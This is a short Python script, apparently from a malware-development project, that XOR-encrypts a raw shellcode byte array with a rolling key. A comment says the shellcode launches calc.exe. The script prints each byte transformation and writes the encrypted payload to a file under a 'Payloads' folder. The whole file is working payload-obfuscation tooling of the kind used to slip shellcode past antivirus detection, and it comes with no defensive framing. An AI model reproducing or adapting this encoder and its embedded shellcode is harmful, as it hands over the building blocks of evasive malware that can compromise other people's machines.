def encrypt_shellcode(shellcode, base_key):
    encrypted_shellcode = bytearray()
    key = base_key
    i = 0

    for byte in shellcode:
        if key > 0xf0:
            key = base_key
            i = 0

        print(f"{byte:#x} ^ {key:#x} = {byte ^ key:#x}")
        
        encrypted_shellcode.append(byte ^ key)
        key = key + i

        i += 1
    return encrypted_shellcode


# Example Shellcode to launch calc.exe
shellcode = bytearray(
    b"\xeb\x27\x5b\x53\x5f\xb0\x65\xfc\xae\x75\xfd\x57\x59\x53"
    b"\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f"
    b"\xf0\xd5\x74\x07\x80\x3e\x65\x75\xea\xeb\xe6\xff\xe1\xe8"
    b"\xd4\xff\xff\xff\x10\x65\xec\x58\x93\xf4\xe0\xf8\xd0\x10"
    b"\x10\x10\x51\x41\x51\x40\x42\x41\x46\x58\x21\xc2\x75\x58"
    b"\x9b\x42\x70\x58\x9b\x42\x08\x58\x9b\x42\x30\x58\x9b\x62"
    b"\x40\x58\x1f\xa7\x5a\x5a\x5d\x21\xd9\x58\x21\xd0\xbc\x2c"
    b"\x71\x6c\x12\x3c\x30\x51\xd1\xd9\x1d\x51\x11\xd1\xf2\xfd"
    b"\x42\x51\x41\x58\x9b\x42\x30\x9b\x52\x2c\x58\x11\xc0\x9b"
    b"\x90\x98\x10\x10\x10\x58\x95\xd0\x64\x77\x58\x11\xc0\x40"
    b"\x9b\x58\x08\x54\x9b\x50\x30\x59\x11\xc0\xf3\x46\x58\xef"
    b"\xd9\x51\x9b\x24\x98\x58\x11\xc6\x5d\x21\xd9\x58\x21\xd0"
    b"\xbc\x51\xd1\xd9\x1d\x51\x11\xd1\x28\xf0\x65\xe1\x5c\x13"
    b"\x5c\x34\x18\x55\x29\xc1\x65\xc8\x48\x54\x9b\x50\x34\x59"
    b"\x11\xc0\x76\x51\x9b\x1c\x58\x54\x9b\x50\x0c\x59\x11\xc0"
    b"\x51\x9b\x14\x98\x58\x11\xc0\x51\x48\x51\x48\x4e\x49\x4a"
    b"\x51\x48\x51\x49\x51\x4a\x58\x93\xfc\x30\x51\x42\xef\xf0"
    b"\x48\x51\x49\x4a\x58\x9b\x02\xf9\x47\xef\xef\xef\x4d\x58"
    b"\xaa\x11\x10\x10\x10\x10\x10\x10\x10\x58\x9d\x9d\x11\x11"
    b"\x10\x10\x51\xaa\x21\x9b\x7f\x97\xef\xc5\xab\xe0\xa5\xb2"
    b"\x46\x51\xaa\xb6\x85\xad\x8d\xef\xc5\x58\x93\xd4\x38\x2c"
    b"\x16\x6c\x1a\x90\xeb\xf0\x65\x15\xab\x57\x03\x62\x7f\x7a"
    b"\x10\x49\x51\x99\xca\xef\xc5\x73\x71\x7c\x73\x3e\x75\x68"
    b"\x75\x10\xf0\xd5"
)




base_key = 0x1
encrypted = encrypt_shellcode(shellcode, base_key)
print("____________________________________")
decrypted = encrypt_shellcode(encrypted, base_key)

file_path = "C:\\Users\\xorsg\\malware-development\\Payloads\\XOR_OpenCalc.bin"


with open(file_path, 'wb') as file:
    file.write(encrypted)